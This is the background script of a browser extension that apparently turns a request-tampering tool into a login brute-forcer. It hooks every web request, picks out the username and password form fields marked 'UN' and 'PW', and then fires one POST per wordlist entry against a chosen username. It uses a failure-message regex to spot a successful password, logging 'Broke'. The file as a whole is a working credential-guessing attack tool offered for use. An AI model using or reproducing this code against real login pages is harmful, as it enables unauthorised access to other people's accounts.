var isTampering = false;
var windowopen = false;
var types = [];
var pattern = false;
var failpattern;
var crackuser;
var wordlist;
var msgHandler = ()=>{};
function handleMessage(msg){
	msgHandler(msg);
}



function tamper_header_listener(e) {
	if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
	if(!~types.indexOf(e.type)) return e;
	if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
	return new Promise(done=>{
		var data = {
			method: e.method,
			url: e.url,
			type: e.type,
			headers: []
		};
		e.requestHeaders.forEach(function (header) {
			data.headers.push({
				name: header.name,
				value: header.value
			});
		});
done({requestHeaders: data.headers});
});
}

function tamper_request_listener(e){
	if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
	if(!~types.indexOf(e.type)) return e;
	if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
	return new Promise(done=>{
		var body = [];
		if(e.requestBody && e.requestBody.formData){
			for(var n in e.requestBody.formData){
				if(e.requestBody.formData.hasOwnProperty(n)) body.push({name: n, value: e.requestBody.formData[n][0]});
			}
		}
		var data = {
			method: e.method,
			url: e.url,
			type: e.type,
			body: body
		};
done(e);
var un_f;
var pw_f;
var badpasserror = failpattern;
data.body.forEach(body=>{
if(body.value === "UN") {
un_f = body.name;
console.log("Username Feild: " + un_f);
}
if(body.value === "PW") {
pw_f = body.name;
console.log("Pass Feild: " + pw_f);
}
else {
console.log("Other param: " + body.name);
}
});
console.log(e.originUrl);
var wordbyline = wordlist.split("\n");
for(var iter = 0; iter < wordbyline.length; iter++) {
var xhr = new XMLHttpRequest();
xhr.open("POST", e.originUrl, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send(un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
xhr.onload = function() {
var databack = this.responseText;
if (databack.length < 5) {
 console.log("Error short page.");
}
else if((databack.match(RegExp(badpasserror), "gi") != null) && (databack.length > 5)) {
  console.log("Bad password");
}
else if((databack.match(RegExp(badpasserror), "gi") === null) && (databack.length > 5)) {
console.log("Broke");
}
}


console.log("Trying: " + wordbyline[iter]);

}
});
}

function stop_tamper_listener(){
	var listening = browser.webRequest.onBeforeSendHeaders.hasListener(tamper_header_listener);
	if(listening){
		browser.webRequest.onBeforeSendHeaders.removeListener(tamper_header_listener);
		browser.webRequest.onBeforeRequest.removeListener(tamper_request_listener);
	}
}

function start_tamper_listener(){
	browser.webRequest.onBeforeSendHeaders.addListener(
		tamper_header_listener,
		{urls: ["<all_urls>"]},
		["blocking", "requestHeaders"]
	);
	browser.webRequest.onBeforeRequest.addListener(
		tamper_request_listener,
		{urls: ["<all_urls>"]},
		["blocking", "requestBody"]
	);
}

function user_confirm_tamper(){
return new Promise(done=>{
		browser.windows.create({
			url: "popup.html",
			type: "panel",
			allowScriptsToClose: true
		}).then(w=>{
			msgHandler = msg=>{
				types = msg.types;
				pattern = msg.docpattern;
                                failpattern = msg.failpattern;
                                crackuser = msg.crackuser;
                                wordlist = msg.wordlist;
				browser.windows.getCurrent().then(wi=>{
					browser.windows.remove(wi.id);
					done(msg);
				});
			};
		});
	});

}

function user_modify_headers(data){ 
	return new Promise(done=>{
		browser.windows.create({
			url: "headers.html?"+encodeURIComponent(JSON.stringify(data)),
			type: "panel",
			allowScriptsToClose: true
		}).then(w=>{
			msgHandler = msg=>{
				browser.windows.getCurrent().then(wi=>{
					browser.windows.remove(wi.id);
					done(msg);
				});
			};
		});
	});
}

function user_modify_body(data){
}

function confirm_and_start_tamper(){
	user_confirm_tamper().then(res=>{
		if(res.tamper === true){
			isTampering = true;
			browser.browserAction.setIcon({
				path: {
					"48": "images/crackedegg.png",
					"32": "images/crackedegg.png",
					"16": "images/crackedegg.png"
				}
			});
			start_tamper_listener();
		}
	});
}

function stop_tampering(){
	isTampering = false;
	browser.browserAction.setIcon({
		path: {
			"48": "images/wholeegg.png",
			"32": "images/wholeegg.png",
 			"16": "images/wholeegg.png"
		}
	});
	stop_tamper_listener();
}

browser.runtime.onMessage.addListener(handleMessage);
browser.browserAction.onClicked.addListener(()=>{
	if(!isTampering) confirm_and_start_tamper();
	else stop_tampering();
});

